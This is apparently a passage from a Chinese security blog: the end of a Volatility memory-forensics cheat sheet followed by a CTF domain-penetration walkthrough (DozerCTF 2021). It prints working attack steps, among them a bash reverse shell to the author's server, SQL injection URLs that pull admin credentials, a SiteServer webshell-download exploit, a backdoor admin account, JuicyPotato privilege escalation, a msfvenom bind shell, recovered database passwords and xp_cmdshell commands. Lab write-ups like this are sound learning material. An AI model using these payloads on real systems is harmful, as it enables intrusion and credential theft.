winxp.raw --profile=WinXPSP3x86 sockscan # TrueCrypt摘要TrueCrypt摘要 volatility -f winxp.raw --profile=WinXPSP3x86 timeliner # 尽可能多的发现目标主机痕迹 volatility -f winxp.raw --profile=WinXPSP3x86 hivelist # 检索所有注册表蜂巢 volatility -f winxp.raw --profile=WinXPSP3x86 hivedump -o 0xe144f758 # 检索SAM注册表键值对 volatility -f winxp.raw --profile=WinXPSP3x86 dumpregistry -D . # 导出注册表 volatility -f winxp.raw --profile=WinXPSP3x86 printkey -K \"SAM\\Domains\\Account\\Users\\Names\" # 检索注册表中账号密码 volatility -f winxp.raw --profile=WinXPSP3x86 hashdump -y system地址 -s SAM地址 # dump目标账号Hash值 volatility -f winxp.raw --profile=WinXPSP3x86 printkey -K \"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" # 查最后登录的用户 volatility -f winxp.raw --profile=WinXPSP3x86 userassist # 查询程序运行次数 volatility --plugins=plugins/bitlocker -f memdump.mem --profile=Win7SP1x64 bitlocker # 导出 bitlocker 密钥，需要安装插件 （参考了 Volatility 内存数字取证方法, thx 这比赛太卷啦太卷啦！ 最后十分钟疯狂掉分，太刺激啦！！！ 感谢队友带喵喵一起玩 qwq！ （溜了溜了喵~","path":"2021/06/28/CTF_2021qiangwang/"},{"title":"Pentest | 2021 DozerCTF 域渗透 Workthrough","text":"本文首发于先知社区：https://xz.aliyun.com/t/9738 本文所涉及的内容仅供以安全为目的的学习研究使用，不得将其用于非法用途，否则后果自行承担！ 0x00 引言五月底有个 DozerCTF，比赛时间和 XCTF Final、DASCTF 等几个比赛冲突了，于是当时这个比赛就基本没看了。 不过里面有个域渗透的题目还是挺有意思的，正好咱还没玩过域渗透，趁这个机会就来学一下相关的知识，来练练手。 题目描述： 目标人物flag，模拟一次红队行动吧。 http://web1.dozer.team:8082/ （这篇文章发出来的时候环境已经关了） 由于最近比较忙，这题在比赛的时候没怎么打，大部分是之后复现的，题目环境重置了好几次，然而复现的时候域环境还是被师傅们打烂了。 于是这篇文章就算是个渗透过程的记录吧，断断续续写的，过程中由于环境重置或者 shell 不稳定的原因导致重新打了好几次，前后会有些不连续，操作也不熟悉，写的也比较乱，师傅们随意看看就好了。Orz 0x01 10.10.1.47 LightCMS入口是 LightCMS 后台登录信息群里已经给了 即 dozer / dozer123 参考： gml 郭院士的 lightcms后台RCE漏洞挖掘 Ying 师傅的 LightCMS全版本后台RCE 0day分析 LightCMS 文件上传&amp;&amp;phar反序列化rce漏洞复现 再谈Laravel Debug mode RCE（CVE-2021-3129）漏洞 GitHub: PHPGGC: PHP Generic Gadget Chains 然而当时用这个反序列化的洞打不通……最后换了个打法。 在 /admin/neditor/serve/catchimage 接口存在任意文件读取，可以读取 /var/www/html/app/Http/Controllers/Admin/NEditorController.php 文件。 发现 /admin/neditor/serve/testInclude 这个路由下可以进行文件包含，从而执行命令。 首先在内容管理-文章这里上传一句话木马。 然后在这个路由下执行，比如： 1=system('bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1');&amp;file=./upload/image/202105/iAWvVAZTHl35fVW29B5zk6iLh6G7K5tDQXL0PaX9.gif 在 vps 上就能拿到 shell，进而在根目录下拿到第一个 flag 了。 这里其实有个非预期，系统管理下有个日志的记录，可以直接蹭之前师傅的小车车，知道了 flag 在 /flag_d0z3r 。 在 catchimage 接口直接访问响应里的 url，内容就是 flag。 搜集内网信息ifconfig 顺便发现他用的 lightcms 版本是 1.3.5 顺便看下配置文件。 /var/www/html/config/database.php env 看下环境变量。 于是知道了数据库是 MySQL，用户名/密码均为 user1. （登上去看了看，貌似没啥用 扔个 kscan 上去，扫一波内网。 [√]ssh://10.10.1.47:22 42 SSH-2.0-Op Product:OpenSSH,Version:7.2p2 Ubuntu 4ubuntu2.10,OS:Linux,DeviceType:Ubuntu Linux; protocol 2.0,OtherInfo:Ubuntu Linux; protocol 2.0 [√]microsoft-ds://10.10.1.1:445 103 c�SMBrProduct:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows,HostName:DC01,DeviceType:workgroup: DOZER,OtherInfo:workgroup: DOZER [√]microsoft-ds://10.10.1.234:445 133 ��SMBr Product:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows Server 2008 R2 - 2012 [√]microsoft-ds://10.10.1.231:445 117 q�SMBrProduct:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows Server 2008 R2 - 2012 [√]microsoft-ds://10.10.1.250:445 105 e�SMBrProduct:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows Server 2008 R2 - 2012 [√]https://10.10.1.231:3389 512 QM`��N [√]http://10.10.1.47:80 200 Laravel Product:nginx,Version:1.10.3,OS:Linux,DeviceType:Ubuntu,OtherInfo:Ubuntu,server:nginx/1.10.3 (Ubuntu), 使用可以删除相关路由（routes/web.php、rout [√]http://10.10.1.100:80 403 HTTP/1.1 4 Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0 [√]http://10.10.1.122:80 200 Apache2UbuntuDefaultPage:Itworks Product:Apache httpd,Version:2.4.18,DeviceType:(Ubuntu),OtherInfo:(Ubuntu),server:Apache/2.4.18 (Ubuntu),rticularconfigurationsnippetsw [√]http://10.10.1.231:80 404 HTTP/1.1 4 Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0 [√]http://10.10.1.234:80 200 HTTP/1.1 2 Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0 [√]http://10.10.1.100:81 403 403-禁止访问:访问被拒绝。 Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0,:访问被拒绝。服务器错误403-禁止访问:访问被拒绝。您无权 [√]http://10.10.1.250:80 200 DozerCTF2021–又一个WordPress站点 Product:Apache httpd,Version:2.4.39,DeviceType:(Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,OtherInfo:(Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,server:Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,RSSWordPress.orgDozerCTF2021,自 [√]mysql://10.10.1.250:3306 71 C�jHost Product:MySQL,DeviceType:unauthorized,OtherInfo:unauthorized [√]http://10.10.1.122:8888 200 Directorylistingfor/ Product:SimpleHTTPServer,Version:0.6,DeviceType:Python 3.5.2,OtherInfo:Python 3.5.2,server:SimpleHTTP/0.6 Python/3.5.2,ldNZOmxkq3769/ctLoSsHXtMKzmiPz [√]http://10.10.1.122:9999 200 Directorylistingfor/ Product:SimpleHTTPServer,Version:0.6,DeviceType:Python 3.5.2,OtherInfo:Python 3.5.2,server:SimpleHTTP/0.6 Python/3.5.2,private-84758d0d58d44984879202 [√]https://10.10.1.100:443 200 Outlook Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0,94jMMZwmJD5JAhCfWPm0e2+MGKDYRQ,CN=exch 大概包括： 10.10.1.1 域控 http://10.10.1.47 本机 https://10.10.1.100:443 Outlook Exchange http://10.10.1.122 一个 web 服务器 Apache httpd http://10.10.1.231 另一个 web 服务器 IIS http://10.10.1.234 web 服务器 IIS http://10.10.1.250/ wordpress 这里之后复现的时候整个域环境都重置了，丢了个 fscan 上去重新扫了一波。 （还是 fscan 看起来更舒服一点 # ./fscan -h 10.10.1.1/24 10.10.1.1:139 open 10.10.1.231:139 open 10.10.1.234:139 open 10.10.1.250:139 open 10.10.1.121:139 open 10.10.1.250:135 open 10.10.1.234:135 open 10.10.1.121:135 open 10.10.1.1:135 open 10.10.1.47:22 open 10.10.1.231:135 open 10.10.1.100:81 open 10.10.1.250:80 open 10.10.1.234:80 open 10.10.1.231:80 open 10.10.1.122:80 open 10.10.1.100:443 open 10.10.1.100:808 open 10.10.1.250:3306 open 10.10.1.231:1433 open 10.10.1.231:445 open 10.10.1.234:445 open 10.10.1.250:445 open 10.10.1.121:445 open 10.10.1.1:445 open 10.10.1.122:1080 open 10.10.1.100:80 open 10.10.1.47:80 open 10.10.1.122:8000 open 10.10.1.122:9000 open 10.10.1.122:8080 open 10.10.1.100:8172 open 10.10.1.122:9096 open 10.10.1.122:9090 open 10.10.1.122:10010 open 10.10.1.1:88 open [*] 10.10.1.121 DOZER\\DESKTOP-ALICE Windows Server 2012 Datacenter 9200 NetInfo: [*]10.10.1.121 [-&gt;]Deskto-Alice [-&gt;]10.10.1.121 NetInfo: [*]10.10.1.1 [-&gt;]dc01 [-&gt;]10.10.1.1 NetInfo: [*]10.10.1.234 [-&gt;]WIN-UIARPOTP0AL [-&gt;]10.10.1.234 [*] 10.10.1.1 [+]DC DOZER\\DC01 Windows Server 2012 Standard 9200 [*] 10.10.1.234 WORKGROUP\\WIN-UIARPOTP0AL Windows Server 2012 Datacenter 9200 [*] 10.10.1.1 (Windows Server 2012 Standard 9200) [*] 10.10.1.231 DOZER\\SQLSERVER14 Windows Server 2012 Standard 9200 NetInfo: [*]10.10.1.231 [-&gt;]Sqlserver14 [-&gt;]10.10.1.231 [*] WebTitle:http://10.10.1.100 code:403 len:0 title:None [*] WebTitle:http://10.10.1.47 code:200 len:7 title:Laravel [*] WebTitle:http://10.10.1.100:81 code:403 len:1157 title:403 - 禁止访问: 访问被拒绝。 [*] WebTitle:https://10.10.1.100 code:302 len:0 title:None [*] WebTitle:http://10.10.1.122 code:200 len:37 title:Apache2 Ubuntu Default Page: It works [*] WebTitle:http://10.10.1.231 code:404 len:0 title:None NetInfo: [*]10.10.1.250 [-&gt;]web02 [-&gt;]10.10.1.250 [*] 10.10.1.250 DOZER\\WEB02 Windows Server 2012 Standard 9200 [*] WebTitle:http://10.10.1.122:8080 code:200 len:10795 title:DozerCTF 2021 &amp;#8211; 又一个WordPress站点 [*] WebTitle:http://10.10.1.122:9000 code:200 len:11321 title:Apache2 Ubuntu Default Page: It works [*] WebTitle:https://10.10.1.100/owa/ code:200 len:28240 title:Outlook [*] WebTitle:http://10.10.1.234 code:200 len:171 title:None [*] WebTitle:http://10.10.1.250 code:200 len:46 title:DozerCTF 2021 &amp;#8211; 又一个WordPress站点 噢还漏了个 10.10.1.121 DOZER\\DESKTOP-ALICE，上面说不定还有域管的 hash。 在 10.10.1.47 上用 frp / iox 之类的开个 socks 代理到自己的 vps，然后再转发到本地，这样就能直接从本地连到内网里了。 Linux 下直接在 proxychains 里配好 socks 连接，而后执行命令的时候直接 proxychains 要执行的命令 就完事了。 可以参考 内网渗透之端口转发与代理工具总结 0x02 10.10.1.234 SiteServer Hint: 有一次，运维人员在吃饭的时候提到了他们用了siteserver 直接访问 http://10.10.1.234/ 得到 &lt;script&gt;var $pageInfo = {publishmentSystemID : 1, channelID : 1, contentID : 0, siteUrl : \"\", homeUrl : \"/home\", currentUrl : \"/\", rootUrl : \"\", apiUrl : \"/api\"};&lt;/script&gt; 利用报错，发现了他目录是 /siteserver/ 进而发现是个 siteserver 登录页面： http://10.10.1.234/siteserver/login.aspx 参考 溯源复现SiteServer5疑似在野0day 可以分别拿到 UserName、Password、PasswordSalt。 http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20Username%20from%20bairong_Administrator-- Admin http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%201%20Password%20from%20bairong_Administrator-- leonsec http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20PasswordSalt%20from%20bairong_Administrator-- D79FHgmyyy5RH7WnljqNBQ== （不过貌似没啥用 然后查一查 SiteServer 有啥漏洞，果然就有现成的。 简记野生应急捕获到的siteserver远程模板下载Getshell漏洞 SiteServer CMS 5.x 漏洞复现&amp;分析 https://github.com/zhaoweiho/SiteServer-CMS-Remote-download-Getshell 发现直接打过去无法访问，噢 GitHub 啊，没事了。 那试试 fastgit 的代理。 首先按照 README 的说明，把 downloadurl 给换掉。 懒得配 C# 环境了，直接找了个在线的执行就完事了。 http://www.dooccn.com/csharp/ using System; using System.IO; using System.Security.Cryptography; using System.Text; namespace EncryptApplication { class Encrypt { static void Main(string[] args) { var _encryptKey = \"vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5\"; var _decryptKey = \"vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5\"; var _inputString = \"https://raw.fastgit.org/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/webshell/poxteam.zip\"; var _outString = \"\"; var _noteMessage = \"\"; byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF }; try{ var byKey = Encoding.UTF8.GetBytes(_encryptKey.Length &gt; 8 ? _encryptKey.Substring(0, 8) : _encryptKey); var des = new DESCryptoServiceProvider(); var inputByteArray = Encoding.UTF8.GetBytes(_inputString); var ms = new MemoryStream(); var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write); cs.Write(inputByteArray, 0, inputByteArray.Length); cs.FlushFinalBlock(); _outString = Convert.ToBase64String(ms.ToArray()); Console.WriteLine(\"DesEncrypt:\"); Console.WriteLine(_outString); } catch (Exception error) { _noteMessage = error.Message; } } } } 生成的地址再用 python 替换一下几个字符。 aZlBAFKTavDq1a13yzD3E1jziPhCL9Y1W0HUgoWERF7oXIBq9tKZFNVSSoWFIGM+wUVVDMPLriIYZOrTHFNH6wuBxt9fr/hX771Ey8w4BJ0t1koCOIzYQO2arzX9xfWGb1bTT6ElmWU= # python str_decry.replace(\"+\", \"0add0\").replace(\"=\", \"0equals0\").replace(\"&amp;\", \"0and0\").replace(\"?\", \"0question0\").replace(\"/\", \"0slash0\") aZlBAFKTavDq1a13yzD3E1jziPhCL9Y1W0HUgoWERF7oXIBq9tKZFNVSSoWFIGM0add0wUVVDMPLriIYZOrTHFNH6wuBxt9fr0slash0hX771Ey8w4BJ0t1koCOIzYQO2arzX9xfWGb1bTT6ElmWU0equals0 ？？？怎么还是不行？ 于是放自己 vps 上试了试，发现根本没有请求记录，看来 不出网。 气死了。 么得办法，只能先把文件传到最开始的机器上，然后起个 web 服务，再把文件通过这台下载。 http://10.10.1.47:12345/poxteam.zip ZjYIub/YxA05+dg8BqV7gX//DhYyedHPT79r6KQFp5dKGh7t/3uUZA== ZjYIub0slash0YxA050add0dg8BqV7gX0slash00slash0DhYyedHPT79r6KQFp5dKGh7t0slash03uUZA0equals00equals0 http://10.10.1.234/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&amp;userKeyPrefix=test&amp;downloadUrl=ZjYIub0slash0YxA050add0dg8BqV7gX0slash00slash0DhYyedHPT79r6KQFp5dKGh7t0slash03uUZA0equals00equals0&amp;directoryName=test233 终于拿到马了。 http://10.10.1.234/SiteFiles/SiteTemplates/test233/include.aspx 好耶！ 好家伙，一堆的 shell。 看了下这台机器貌似没有域环境。 然后找了半天没找到 flag 在哪…… 再整个冰蝎🐎传上去。 # whoami iis apppool\\defaultapppool systeminfo 主机名: WIN-UIARPOTP0AL OS 名称: Microsoft Windows Server 2012 Datacenter OS 版本: 6.2.9200 暂缺 Build 9200 OS 制造商: Microsoft Corporation OS 配置: 独立服务器 OS 构件类型: Multiprocessor Free 注册的所有人: Windows 用户 注册的组织: 产品 ID: 00184-70000-00000-AA252 初始安装日期: 2021/5/15, 19:55:24 系统启动时间: 2021/5/30, 12:38:55 系统制造商: VMware, Inc. 系统型号: VMware Virtual Platform 系统类型: x64-based PC 处理器: 安装了 1 个处理器。 [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 Mhz BIOS 版本: Phoenix Technologies LTD 6.00, 2019/7/29 Windows 目录: C:\\Windows 系统目录: C:\\Windows\\system32 启动设备: \\Device\\HarddiskVolume1 系统区域设置: zh-cn;中文(中国) 输入法区域设置: zh-cn;中文(中国) 时区: (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐 物理内存总量: 2,047 MB 可用的物理内存: 1,243 MB 虚拟内存: 最大值: 4,095 MB 虚拟内存: 可用: 3,017 MB 虚拟内存: 使用中: 1,078 MB 页面文件位置: C:\\pagefile.sys 域: WORKGROUP 登录服务器: 暂缺 修补程序: 安装了 2 个修补程序。 [01]: KB2999226 [02]: KB4012214 网卡: 安装了 1 个 NIC。 [01]: Intel(R) 82574L 千兆网络连接 连接名: Ethernet0 启用 DHCP: 否 IP 地址 [01]: 10.10.1.234 [02]: fe80::4446:784:6de4:d42a Hyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 寻思着 flag 是不是放在 Administrator 用户桌面上呢？（虽然最后发现并没有这个文件夹 试了好几种提权方法，但一般都是 msf 或者 CS 或者就远程上去弹窗口的，试了都么得用。 发现用的冰蝎的代码执行有点问题，于是再打了个一句话木马，用蚁剑连上去。 最后整了个烂土豆，直接在 webshell 提权好了。 不过有个缺点是貌似只能执行一条命令（？），唔。 貌似也找不到 flag 在哪啊…… 又去找了别人的提权过程…… 比如 记一次Windows渗透提权历程 新建个账号，添加到管理组里。这里就不整影子用户了。 net user root test456123! net localgroup administrators root /add 开启远程桌面。 JuicyPotatoweb.exe -p \"REG ADD \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\" JuicyPotatoweb.exe -p \"REG ADD \\\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\\" /v PortNumber /t REG_DWORD /d 0x00000d3d /f\" REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections 最后一行命令是查询远程桌面是否开启，0x0 表示开启，0x1 表示关闭。 这里发现 rdesktop 又连不上，提示 Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option). 参考 rdesktop连接Windows远程桌面因CredSSP 报错解决办法 折腾了半天，最后换了 remmina 连上了。 上去找了一波啥也没找到，最后发现是在网站根目录的 Web.config.bak… 气死喵喵了。 那直接在最开始的马就能拿到了啊，坏耶！ DozerCTF{b59d9f9e843dedb09e407849f3396cb1} 再看 Web.config &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;configuration&gt; &lt;appSettings&gt; &lt;add key=\"IsProtectData\" value=\"True\" /&gt; &lt;add key=\"DatabaseType\" value=\"9XtLPj6oytMAr6M9jZ0Xvg0equals00equals0\" /&gt; &lt;add key=\"ConnectionString\" value=\"Zg3p37CSquO0slash0DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A0slash0xZh4im63w0tn2nuW7n5XRcDo0equals0\" /&gt; &lt;/appSettings&gt; &lt;system.web&gt; &lt;httpRuntime requestValidationMode=\"2.0\" requestPathInvalidCharacters=\"\" maxRequestLength=\"40960\" executionTimeout=\"2000\" useFullyQualifiedRedirectUrl=\"false\" minFreeThreads=\"8\" minLocalRequestFreeThreads=\"4\" appRequestQueueLimit=\"100\" enableVersionHeader=\"false\" /&gt; &lt;pages validateRequest=\"false\" enableSessionState=\"true\" enableViewState=\"true\" enableEventValidation=\"false\" controlRenderingCompatibilityVersion=\"4.0\" clientIDMode=\"AutoID\" /&gt; &lt;customErrors mode=\"Off\" /&gt; &lt;sessionState mode=\"InProc\" timeout=\"30\" /&gt; &lt;trace enabled=\"false\" requestLimit=\"1000\" pageOutput=\"true\" traceMode=\"SortByTime\" localOnly=\"true\" /&gt; &lt;globalization fileEncoding=\"utf-8\" requestEncoding=\"utf-8\" responseEncoding=\"utf-8\" /&gt; &lt;compilation debug=\"false\" /&gt; &lt;/system.web&gt; &lt;system.webServer&gt; &lt;modules&gt; &lt;!--iisnode默认不支持PUT和DELETE的解决--&gt; &lt;remove name=\"WebDAVModule\" /&gt; &lt;!--路由模型删掉再加一次--&gt; &lt;remove name=\"UrlRoutingModule-4.0\" /&gt; &lt;add name=\"UrlRoutingModule-4.0\" type=\"System.Web.Routing.UrlRoutingModule\" preCondition=\"\" /&gt; &lt;add name=\"ErrorRedirectModule\" type=\"SiteServer.API.ErrorRedirectModule, SiteServer.API\" /&gt; &lt;/modules&gt; &lt;handlers&gt; &lt;remove name=\"ExtensionlessUrlHandler-Integrated-4.0\" /&gt; &lt;remove name=\"OPTIONSVerbHandler\" /&gt; &lt;remove name=\"TRACEVerbHandler\" /&gt; &lt;add name=\"ExtensionlessUrlHandler-Integrated-4.0\" path=\"*.\" verb=\"*\" type=\"System.Web.Handlers.TransferRequestHandler\" preCondition=\"integratedMode,runtimeVersionv4.0\" /&gt; &lt;/handlers&gt; &lt;/system.webServer&gt; &lt;runtime&gt; &lt;assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\"&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"Newtonsoft.Json\" publicKeyToken=\"30ad4fe6b2a6aeed\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-9.0.0.0\" newVersion=\"9.0.0.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"System.Web.Http\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-5.2.3.0\" newVersion=\"5.2.3.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"System.Net.Http.Formatting\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-5.2.3.0\" newVersion=\"5.2.3.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"Microsoft.Owin\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-2.1.0.0\" newVersion=\"2.1.0.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"System.Web.Cors\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-5.2.3.0\" newVersion=\"5.2.3.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"Microsoft.AspNet.SignalR.Core\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-2.2.1.0\" newVersion=\"2.2.1.0\" /&gt; &lt;/dependentAssembly&gt; &lt;/assemblyBinding&gt; &lt;/runtime&gt; &lt;/configuration&gt; 解码一下 ConnectionString 可以得到数据库的连接信息。 s = \"Zg3p37CSquO0slash0DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A0slash0xZh4im63w0tn2nuW7n5XRcDo0equals0\" s = s.replace(\"0add0\", \"+\").replace(\"0equals0\", \"=\").replace(\"0and0\", \"&amp;\").replace(\"0question0\", \"?\").replace(\"0slash0\", \"/\") print(s) # Zg3p37CSquO/DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A/xZh4im63w0tn2nuW7n5XRcDo= C# 解码 using System; using System.IO; using System.Security.Cryptography; using System.Text; namespace EncryptApplication { class Encrypt { static void Main(string[] args) { var _encryptKey = \"vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5\"; var _decryptKey = \"vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5\"; var _inputString = \"Zg3p37CSquO/DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A/xZh4im63w0tn2nuW7n5XRcDo=\"; var _outString = \"\"; var _noteMessage = \"\"; byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF }; try { var byKey = Encoding.UTF8.GetBytes(_decryptKey.Substring(0, 8)); var des = new DESCryptoServiceProvider(); var inputByteArray = Convert.FromBase64String(_inputString); var ms = new MemoryStream(); var cs = new CryptoStream(ms, des.CreateDecryptor(byKey, iv), CryptoStreamMode.Write); cs.Write(inputByteArray, 0, inputByteArray.Length); cs.FlushFinalBlock(); Encoding encoding = new UTF8Encoding(); _outString = encoding.GetString(ms.ToArray()); Console.WriteLine(\"DesEncrypt:\"); Console.WriteLine(_outString); } catch (Exception error) { _noteMessage 27 = error.Message; } } } } 得到 DesEncrypt: server=10.10.1.231;uid=sa;pwd=msO.9uXC;database=site 顺便再练习一下，整个 msf 上线好了。 由于不出网不方便打反向连接，这里整个正向连接吧。 首先利用 msfvenom 生成一个正向连接的 payload。 msfvenom -p windows/meterpreter/bind_tcp LPORT=23333 -f exe -o 1.exe 上传后执行它 然后查看一下网络连接。 netstat -ano 可以看到成功监听了 23333 端口。说明已经跑起来了。 在 msf 里执行监听。 msfconsole use exploit/multi/handler set payload windows/meterpreter/bind_tcp set rhost 10.10.1.234 set lport 23333 exploit 拿到 Meterpreter 会话。 0x03 10.10.1.231 MSSQL那就直接从数据库这里日吧。 直接用 xp_cmdshell 执行命令好了。 ConnString: server=10.10.1.231;uid=sa;pwd=msO.9uXC;database=site;Provider=SQLOLEDB; 发现就是管理员，好唉！ systeminfo 看下系统信息。 主机名: SQLSERVER14 OS 名称: Microsoft Windows Server 2012 Standard OS 版本: 6.2.9200 暂缺 Build 9200 OS 制造商: Microsoft Corporation OS 配置: 成员服务器 OS 构件类型: Multiprocessor Free 注册的所有人: Windows 用户 注册的组织: 产品 ID: 00184-00070-00000-AAOEM 初始安装日期: 2021/5/8, 21:38:55 系统启动时间: 2021/6/2, 22:38:53 系统制造商: VMware, Inc. 系统型号: VMware Virtual Platform 系统类型: x64-based PC 处理器: 安装了 2 个处理器。 [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 Mhz [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 Mhz BIOS 版本: Phoenix Technologies LTD 6.00, 2019/7/29 Windows 目录: C:\\Windows 系统目录: C:\\Windows\\system32 启动设备: \\Device\\HarddiskVolume1 系统区域设置: zh-cn;中文(中国) 输入法区域设置: zh-cn;中文(中国) 时区: (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐 物理内存总量: 4,095 MB 可用的物理内存: 2,421 MB 虚拟内存: 最大值: 8,191 MB 虚拟内存: 可用: 6,463 MB 虚拟内存: 使用中: 1,728 MB 页面文件位置: C:\\pagefile.sys 域: dozer.org 登录服务器: 暂缺 修补程序: 安装了 2 个修补程序。 [01]: KB2999226 [02]: KB4012214 网卡: 安装了 1 个 NIC。 [01]: Intel(R) 82574L 千兆网络连接 连接名: Ethernet0 启用 DHCP: 否 IP 地址 [01]: 10.10.1.231 [02]: fe80::f57d:729c:172a:abd6 Hyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 好家伙，这台机器在域: dozer.org 里了！ 这回 flag 终于在 Administrator 用户桌面上了。 另外这个 DozerOCS.exe 是什么玩意？ Exec master.dbo.xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\flag.txt' DozerCTF{b305d6b074502f341e793c29d821cadd} 然后再考虑一下获取用户密码，说不定有域管的 hash。 tasklist 看一看，发现有杀软。 映像名称 PID 会话名 会话# 内存使用 ========================= ======== ================ =========== ============ System Idle Process 0 Services 0 20 K System 4 Services 0 368 K smss.exe 332 Services 0 1,044 K csrss.exe 432 Services 0 5,964 K wininit.exe 512 Services 0 3,900 K csrss.exe 520 Console 1 27,296 K winlogon.exe 564 Console 1 6,688 K services.exe 608 Services 0 9,572 K lsass.exe 616 Services 0 13,740 K svchost.exe 708 Services 0 9,172 K svchost.exe 760 Services 0 6,852 K svchost.exe 808 Services 0 16,076 K dwm.exe 872 Console 1 48,020 K svchost.exe 884 Services 0 44,172 K svchost.exe 964 Services 0 13,484 K svchost.exe 660 Services 0 16,520 K svchost.exe 1108 Services 0 11,084 K spoolsv.exe 1276 Services 0 11,364 K svchost.exe 1312 Services 0 7,696 K sqlservr.exe 1340 Services 0 153,868 K sqlwriter.exe 1472 Services 0 5,824 K svchost.exe 1520 Services 0 12,036 K VGAuthService.exe 1544 Services 0 8,616 K vmtoolsd.exe 1580 Services 0 19,000 K svchost.exe 1600 Services 0 8,144 K avp.exe 1628 Services 0 26,532 K svchost.exe 2052 Services 0 4,724 K WmiPrvSE.exe 2248 Services 0 24,720 K dllhost.exe 2348 Services 0 10,420 K msdtc.exe 2564 Services 0 7,268 K avpui.exe 3076 Console 1 186,908 K taskhostex.exe 3132 Console 1 14,008 K explorer.exe 3240 Console 1 103,624 K vm3dservice.exe 3944 Console 1 3,588 K vmtoolsd.exe 3956 Console 1 32,316 K avpsus.exe 3184 Services 0 7,920 K WmiPrvSE.exe 2212 Services 0 6,128 K powershell.exe 1048 Console 1 71,740 K conhost.exe 3148 Console 1 28,332 K powershell.exe 3188 Console 1 71,192 K conhost.exe 2300 Console 1 27,784 K DozerOCS.exe 3728 Console 1 6,948 K svchost.exe 4828 Services 0 37,936 K csrss.exe 3572 RDP-Tcp#0 2 17,632 K winlogon.exe 3844 RDP-Tcp#0 2 5,840 K dwm.exe 4440 RDP-Tcp#0 2 31,812 K avpui.exe 4124 RDP-Tcp#0 2 664 K taskhostex.exe 4752 RDP-Tcp#0 2 8,980 